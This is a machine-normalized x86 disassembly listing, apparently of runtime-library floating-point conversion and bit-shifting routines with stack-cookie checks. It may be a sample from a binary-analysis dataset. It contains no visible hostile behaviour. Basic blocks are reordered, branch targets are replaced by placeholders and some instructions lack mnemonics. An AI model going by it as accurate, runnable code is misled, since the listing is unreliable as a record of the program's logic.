mov ecx [ esi + eax * 4 ]
lea edx [ ecx + 0x1 ]
xor edi edi
cmp edx ecx
jb r-xdata
xor edi edi
inc edi
cmp edx 0x1
jae r-xdata
mov [ esi + eax * 4 ] edx
mov ecx edi
sub_43e53e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
push 0x3
pop edx
sub ecx eax
push esi
mov esi [ eax ]
mov [ ecx + eax ] esi
add eax 0x4
dec edx
jne r-xdata
pop esi
pop ebp
retn
sub_43e56e
mov edi edi
push ebp
mov ebp esp
xor eax eax
xor eax eax
pop ebp
retn
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + eax * 4 ] 0x0
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_43e58d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
cdq
and edx 0x1f
sub esp 0xc
add eax edx
mov edx [ ebp + 0xc ]
push esi
sar eax 0x5
and edx 0x8000001f
push edi
jns r-xdata
and [ ebp - 0x8 ] 0x0
and [ ebp + 0xc ] 0x0
mov edi [ ebp + 0x8 ]
or esi 0xffffffff
mov ecx edx
shl esi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
push ebx
not esi
dec edx
or edx 0xffffffe0
inc edx
mov ecx [ ebp + 0xc ]
mov ebx [ edi + ecx * 4 ]
and ebx esi
mov [ ebp - 0xc ] ebx
mov ebx [ edi + ecx * 4 ]
mov ecx edx
shr ebx cl
mov ecx [ ebp + 0xc ]
or ebx [ ebp - 0x8 ]
mov [ edi + ecx * 4 ] ebx
mov ebx [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
shl ebx cl
inc [ ebp + 0xc ]
cmp [ ebp + 0xc ] 0x3
mov [ ebp - 0x8 ] ebx
jl r-xdata
push 0x2
pop ecx
mov edx ecx
sub edx eax
lea edx [ edi + edx * 4 ]
pop ebx
and [ edi + ecx * 4 ] 0x0
mov esi [ edx ]
mov [ edi + ecx * 4 ] esi
jmp r-xdata
cmp ecx eax
jl r-xdata
pop edi
pop esi
leave
retn
sub edx 0x4
dec ecx
jns r-xdata
sub_43e625
mov edi edi
push ebp
mov ebp esp
sub esp 0x3c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x38 ] ecx
movzx ecx [ eax + 0xa ]
mov edx ecx
and ecx 0x8000
mov [ ebp - 0x3c ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
push ebx
mov ebx [ ebp + 0x10 ]
and edx 0x7fff
sub edx 0x3fff
shl eax 0x10
push esi
push edi
mov [ ebp - 0x20 ] edx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
cmp edx 0xffffc001
jne r-xdata
and [ ebp - 0x30 ] 0x0
lea esi [ ebp - 0x10 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax edx
movsd [ edi ] [ esi ]
mov edi [ ebx + 0x8 ]
mov [ ebp - 0x2c ] eax
dec edi
lea eax [ edi + 0x1 ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
lea edx [ edi + 0x1 ]
and edx 0x8000001f
mov [ ebp - 0x28 ] eax
jns r-xdata
xor esi esi
xor eax eax
lea esi [ ebp + eax * 4 - 0x10 ]
push 0x1f
xor eax eax
pop ecx
sub ecx edx
inc eax
shl eax cl
mov [ ebp - 0x34 ] ecx
test [ esi ] eax
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x34 ]
or eax 0xffffffff
shl eax cl
push 0x3
pop ecx
and [ esi ] eax
mov eax [ ebp - 0x28 ]
inc eax
cmp eax ecx
jge r-xdata
mov eax [ ebp - 0x28 ]
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x10 ] edx
jmp r-xdata
push 0x2
pop eax
jmp r-xdata
cmp [ ebp + eax * 4 - 0x10 ] esi
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x30 ] 0x0
je r-xdata
lea edi [ ebp + eax * 4 - 0x10 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
push 0x1f
pop ecx
sub ecx [ ebx + 0xc ]
mov ebx [ ebx + 0x10 ]
shl esi cl
mov ecx [ ebp - 0x3c ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or esi ecx
or esi [ ebp - 0x10 ]
cmp ebx 0x40
jne r-xdata
xor eax eax
mov eax [ ebx + 0x4 ]
mov ecx [ ebp - 0x20 ]
mov edx eax
sub edx [ ebx + 0x8 ]
cmp ecx edx
jge r-xdata
inc [ ebp - 0x20 ]
mov eax edi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and edi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
cmp ebx 0x20
jne r-xdata
mov ecx [ ebp - 0x38 ]
mov edx [ ebp - 0xc ]
mov [ ecx + 0x4 ] esi
mov [ ecx ] edx
jmp r-xdata
cmp ecx eax
jg r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
and [ ebp - 0x30 ] 0x0
sub ecx edi
xor edx edx
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edi [ ecx ]
add edi edx
mov [ ebp - 0x24 ] edi
mov edi [ ecx ]
cmp [ ebp - 0x24 ] edi
jb r-xdata
dec edi
or edi 0xffffffe0
inc edi
cmp [ ebp + eax * 4 - 0x10 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4247dc
leave
retn
mov ecx [ ebp - 0x38 ]
mov [ ecx ] esi
cmp ecx [ ebx ]
mov ecx [ ebx + 0xc ]
jl r-xdata
sub eax [ ebp - 0x2c ]
lea esi [ ebp - 0x1c ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx eax
cdq
and edx 0x1f
movsd [ edi ] [ esi ]
lea esi [ edx + eax ]
mov edx ecx
sar esi 0x5
and edx 0x8000001f
jns r-xdata
xor esi esi
mov [ ebp - 0x30 ] 0x1
cmp [ ebp - 0x24 ] edx
jmp r-xdata
mov esi [ ebx + 0x14 ]
add esi [ ebp - 0x20 ]
and [ ebp - 0x10 ] 0x7fffffff
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov edx ecx
and edx 0x8000001f
mov [ ebp - 0x34 ] eax
jns r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x10 ] 0x80000000
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or eax 0xffffffff
mov ecx edx
shl eax cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not eax
dec edx
or edx 0xffffffe0
inc edx
test ecx ecx
je r-xdata
mov [ ebp - 0x30 ] ecx
jae r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or esi 0xffffffff
mov ecx edx
shl esi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not esi
dec edx
or edx 0xffffffe0
inc edx
mov ecx [ ebp - 0x20 ]
mov edi [ ebp + ecx * 4 - 0x10 ]
mov ecx edi
and ecx eax
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr edi cl
mov ecx [ ebp - 0x20 ]
or edi [ ebp - 0x28 ]
mov [ ebp + ecx * 4 - 0x10 ] edi
mov edi [ ebp - 0x2c ]
mov ecx [ ebp - 0x24 ]
shl edi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] edi
jl r-xdata
mov edx esi
push 0x2
shl edx 0x2
lea eax [ ebp - 0x8 ]
pop ecx
sub eax edx
and [ ebp - 0x30 ] 0x0
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edx [ ecx ]
lea edi [ edx + 0x1 ]
mov [ ebp - 0x24 ] edi
cmp edi edx
jb r-xdata
dec eax
mov edx [ ebp - 0x24 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x30 ]
jns r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ ebp + eax * 4 - 0x10 ]
mov ecx eax
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr eax cl
mov ecx [ ebp - 0x20 ]
or eax [ ebp - 0x28 ]
mov [ ebp + ecx * 4 - 0x10 ] eax
mov eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x24 ]
shl eax cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] eax
jl r-xdata
mov edx [ ebp - 0x34 ]
mov edi edx
push 0x2
shl edi 0x2
lea eax [ ebp - 0x8 ]
pop ecx
sub eax edi
mov ecx [ ebp - 0x20 ]
mov edi [ ebp + ecx * 4 - 0x10 ]
mov ecx edi
and ecx esi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr edi cl
mov ecx [ ebp - 0x20 ]
or edi [ ebp - 0x28 ]
mov [ ebp + ecx * 4 - 0x10 ] edi
mov edi [ ebp - 0x2c ]
mov ecx [ ebp - 0x24 ]
shl edi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] edi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp + ecx * 4 - 0x10 ] 0x0
mov edx [ eax ]
mov [ ebp + ecx * 4 - 0x10 ] edx
jmp r-xdata
cmp edi 0x1
and [ ebp + ecx * 4 - 0x10 ] 0x0
mov edi [ eax ]
mov [ ebp + ecx * 4 - 0x10 ] edi
jmp r-xdata
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
cmp ecx esi
jl r-xdata
mov edi [ ebx + 0x8 ]
dec edi
lea eax [ edi + 0x1 ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
lea edx [ edi + 0x1 ]
and edx 0x8000001f
mov [ ebp - 0x2c ] eax
jns r-xdata
sub eax 0x4
dec ecx
jns r-xdata
cmp ecx edx
jl r-xdata
sub eax 0x4
dec ecx
jns r-xdata
cmp edx eax
jl r-xdata
mov esi [ ebx + 0x14 ]
add esi [ ebx ]
xor eax eax
inc eax
jmp r-xdata
sub ecx 0x4
dec edx
jns r-xdata
push 0x1f
pop ecx
sub ecx edx
xor edx edx
inc edx
shl edx cl
mov [ ebp - 0x34 ] ecx
test [ ebp + eax * 4 - 0x10 ] edx
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
mov ecx [ ebp - 0x34 ]
or edx 0xffffffff
shl edx cl
push 0x3
pop ecx
and [ ebp + eax * 4 - 0x10 ] edx
inc eax
cmp eax ecx
jge r-xdata
or esi 0xffffffff
shl esi cl
mov edx eax
not esi
test [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
mov ecx [ ebx + 0xc ]
lea eax [ ecx + 0x1 ]
cdq
and edx 0x1f
lea esi [ edx + eax ]
lea edx [ ecx + 0x1 ]
sar esi 0x5
and edx 0x8000001f
jns r-xdata
lea edi [ ebp + eax * 4 - 0x10 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or eax 0xffffffff
mov ecx edx
shl eax cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not eax
dec edx
or edx 0xffffffe0
inc edx
mov eax edi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and edi 0x8000001f
jns r-xdata
inc edx
cmp edx 0x3
jl r-xdata
mov ecx [ ebp - 0x20 ]
mov edi [ ebp + ecx * 4 - 0x10 ]
mov ecx edi
and ecx eax
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr edi cl
mov ecx [ ebp - 0x20 ]
or edi [ ebp - 0x28 ]
mov [ ebp + ecx * 4 - 0x10 ] edi
mov edi [ ebp - 0x2c ]
mov ecx [ ebp - 0x24 ]
shl edi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] edi
jl r-xdata
mov edx esi
push 0x2
shl edx 0x2
lea eax [ ebp - 0x8 ]
pop ecx
sub eax edx
and [ ebp - 0x28 ] 0x0
xor edx edx
sub ecx edi
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edi [ ecx ]
lea esi [ edi + edx ]
mov [ ebp - 0x24 ] esi
cmp esi edi
jb r-xdata
dec edi
or edi 0xffffffe0
inc edi
cmp [ ebp + edx * 4 - 0x10 ] 0x0
jmp r-xdata
and [ ebp + ecx * 4 - 0x10 ] 0x0
mov edx [ eax ]
mov [ ebp + ecx * 4 - 0x10 ] edx
jmp r-xdata
mov [ ebp - 0x28 ] 0x1
cmp esi edx
jae r-xdata
cmp ecx esi
jl r-xdata
sub eax 0x4
dec ecx
jns r-xdata
dec eax
jns r-xdata
mov edx [ ebp - 0x24 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x28 ]
jmp r-xdata
test ecx ecx
je r-xdata
mov eax [ ebp - 0x2c ]
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
xor edi edi
cmp esi edx
jb r-xdata
xor edi edi
inc edi
cmp esi 0x1
jae r-xdata
mov [ ecx ] esi
mov ecx edi
sub_43eb74
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x34 ] ecx
movzx ecx [ eax + 0xa ]
push ebx
mov ebx ecx
and ecx 0x8000
mov [ ebp - 0x38 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
and ebx 0x7fff
sub ebx 0x3fff
shl eax 0x10
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
cmp ebx 0xffffc001
jne r-xdata
and [ ebp - 0x24 ] 0x0
push esi
lea esi [ ebp - 0x10 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi [ rw-data ]
dec edi
lea eax [ edi + 0x1 ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
lea edx [ edi + 0x1 ]
and edx 0x8000001f
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] eax
jns r-xdata
xor ebx ebx
xor eax eax
lea esi [ ebp + eax * 4 - 0x10 ]
push 0x1f
xor eax eax
pop ecx
sub ecx edx
inc eax
shl eax cl
mov [ ebp - 0x30 ] ecx
test [ esi ] eax
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
push 0x2
stosd [ edi ]
pop eax
jmp r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x30 ]
or eax 0xffffffff
shl eax cl
push 0x3
pop ecx
and [ esi ] eax
mov eax [ ebp - 0x28 ]
inc eax
cmp eax ecx
jge r-xdata
mov eax [ ebp - 0x28 ]
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x10 ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ rw-data ]
shl ebx cl
mov ecx [ ebp - 0x38 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or ebx ecx
mov ecx [ rw-data ]
or ebx [ ebp - 0x10 ]
cmp ecx 0x40
jne r-xdata
cmp [ ebp + eax * 4 - 0x10 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
lea edi [ ebp + eax * 4 - 0x10 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
cmp ecx 0x20
jne r-xdata
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0xc ]
mov [ ecx + 0x4 ] ebx
mov [ ecx ] edx
jmp r-xdata
mov eax [ rw-data ]
mov ecx eax
sub ecx [ rw-data ]
cmp ebx ecx
jge r-xdata
inc ebx
mov eax edi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and edi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_4247dc
leave
retn
mov ecx [ ebp - 0x34 ]
mov [ ecx ] ebx
cmp ebx eax
jg r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
and [ ebp - 0x24 ] 0x0
sub ecx edi
xor edx edx
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edi [ ecx ]
add edi edx
mov [ ebp - 0x20 ] edi
mov edi [ ecx ]
cmp [ ebp - 0x20 ] edi
jb r-xdata
dec edi
or edi 0xffffffe0
inc edi
cmp [ ebp + eax * 4 - 0x10 ] 0x0
jmp r-xdata
mov ecx [ rw-data ]
cmp ebx [ rw-data ]
jl r-xdata
sub eax [ ebp - 0x2c ]
lea esi [ ebp - 0x1c ]
mov ecx eax
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
cdq
and edx 0x1f
add eax edx
movsd [ edi ] [ esi ]
mov edx ecx
sar eax 0x5
and edx 0x8000001f
movsd [ edi ] [ esi ]
jns r-xdata
push 0x2
xor ebx ebx
pop eax
jmp r-xdata
mov [ ebp - 0x24 ] 0x1
cmp [ ebp - 0x20 ] edx
jmp r-xdata
add ebx [ rw-data ]
and [ ebp - 0x10 ] 0x7fffffff
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x10 ] 0x80000000
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
pop esi
test ecx ecx
je r-xdata
mov [ ebp - 0x24 ] ecx
jae r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or esi 0xffffffff
mov ecx edx
shl esi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not esi
dec edx
or edx 0xffffffe0
inc edx
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp - 0x24 ] 0x0
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edx [ ecx ]
lea edi [ edx + 0x1 ]
mov [ ebp - 0x20 ] edi
cmp edi edx
jb r-xdata
dec eax
mov edx [ ebp - 0x20 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x24 ]
jns r-xdata
mov ecx [ ebp - 0x20 ]
mov edi [ ebp + ecx * 4 - 0x10 ]
mov ecx edi
and ecx esi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr edi cl
mov ecx [ ebp - 0x20 ]
or edi [ ebp - 0x28 ]
mov [ ebp + ecx * 4 - 0x10 ] edi
mov edi [ ebp - 0x2c ]
mov ecx [ ebp - 0x24 ]
shl edi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] edi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
cmp edi 0x1
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
cmp edx eax
jl r-xdata
mov esi [ rw-data ]
dec esi
lea eax [ esi + 0x1 ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
lea edx [ esi + 0x1 ]
and edx 0x8000001f
mov [ ebp - 0x30 ] eax
jns r-xdata
sub ecx 0x4
dec edx
jns r-xdata
cmp edx eax
jl r-xdata
xor eax eax
sub ecx 0x4
dec edx
jns r-xdata
cmp edx eax
jl r-xdata
mov ebx [ rw-data ]
add ebx [ rw-data ]
xor eax eax
inc eax
jmp r-xdata
sub ecx 0x4
dec edx
jns r-xdata
push 0x1f
pop ecx
sub ecx edx
xor edx edx
inc edx
shl edx cl
lea ebx [ ebp + eax * 4 - 0x10 ]
mov [ ebp - 0x2c ] ecx
test [ ebx ] edx
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
mov ecx [ ebp - 0x2c ]
or eax 0xffffffff
shl eax cl
and [ ebx ] eax
mov eax [ ebp - 0x30 ]
inc eax
cmp eax 0x3
jge r-xdata
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x10 ] edx
jmp r-xdata
mov ecx [ rw-data ]
lea eax [ ecx + 0x1 ]
cdq
and edx 0x1f
add eax edx
lea edx [ ecx + 0x1 ]
sar eax 0x5
and edx 0x8000001f
jns r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x10 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp - 0x28 ] 0x0
xor edx edx
sub ecx esi
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x10 ]
mov esi [ ecx ]
lea edi [ esi + edx ]
cmp edi esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x10 ] 0x0
jmp r-xdata
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x28 ] 0x1
cmp edi edx
jae r-xdata
cmp edx eax
jl r-xdata
sub ecx 0x4
dec edx
jns r-xdata
dec eax
jns r-xdata
mov [ ecx ] edi
mov ecx [ ebp - 0x28 ]
jmp r-xdata
test ecx ecx
je r-xdata
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
xor edi edi
cmp esi edx
jb r-xdata
xor edi edi
inc edi
cmp esi 0x1
jae r-xdata
mov [ ecx ] esi
mov ecx edi
sub_43f0c5
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x34 ] ecx
movzx ecx [ eax + 0xa ]
push ebx
mov ebx ecx
and ecx 0x8000
mov [ ebp - 0x38 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
and ebx 0x7fff
sub ebx 0x3fff
shl eax 0x10
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
cmp ebx 0xffffc001
jne r-xdata
and [ ebp - 0x24 ] 0x0
push esi
lea esi [ ebp - 0x10 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi [ rw-data ]
dec edi
lea eax [ edi + 0x1 ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
lea edx [ edi + 0x1 ]
and edx 0x8000001f
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] eax
jns r-xdata
xor ebx ebx
xor eax eax
lea esi [ ebp + eax * 4 - 0x10 ]
push 0x1f
xor eax eax
pop ecx
sub ecx edx
inc eax
shl eax cl
mov [ ebp - 0x30 ] ecx
test [ esi ] eax
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
push 0x2
stosd [ edi ]
pop eax
jmp r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x30 ]
or eax 0xffffffff
shl eax cl
push 0x3
pop ecx
and [ esi ] eax
mov eax [ ebp - 0x28 ]
inc eax
cmp eax ecx
jge r-xdata
mov eax [ ebp - 0x28 ]
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x10 ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ rw-data ]
shl ebx cl
mov ecx [ ebp - 0x38 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or ebx ecx
mov ecx [ rw-data ]
or ebx [ ebp - 0x10 ]
cmp ecx 0x40
jne r-xdata
cmp [ ebp + eax * 4 - 0x10 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
lea edi [ ebp + eax * 4 - 0x10 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
cmp ecx 0x20
jne r-xdata
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0xc ]
mov [ ecx + 0x4 ] ebx
mov [ ecx ] edx
jmp r-xdata
mov eax [ rw-data ]
mov ecx eax
sub ecx [ rw-data ]
cmp ebx ecx
jge r-xdata
inc ebx
mov eax edi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and edi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_4247dc
leave
retn
mov ecx [ ebp - 0x34 ]
mov [ ecx ] ebx
cmp ebx eax
jg r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
and [ ebp - 0x24 ] 0x0
sub ecx edi
xor edx edx
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edi [ ecx ]
add edi edx
mov [ ebp - 0x20 ] edi
mov edi [ ecx ]
cmp [ ebp - 0x20 ] edi
